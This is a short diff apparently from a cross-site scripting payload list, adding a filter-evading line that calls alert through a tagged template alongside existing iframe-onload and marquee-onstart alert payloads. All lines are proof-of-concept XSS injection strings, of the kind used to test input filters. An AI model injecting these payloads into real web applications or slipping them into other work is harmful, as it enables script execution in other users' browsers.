@@ -1,2 +1,3 @@
 <iframe onload=alert`ss`>
 <marquee onstart='javascript:alert('1');'>ss
+''.replace.call`1${/./}${alert}` 
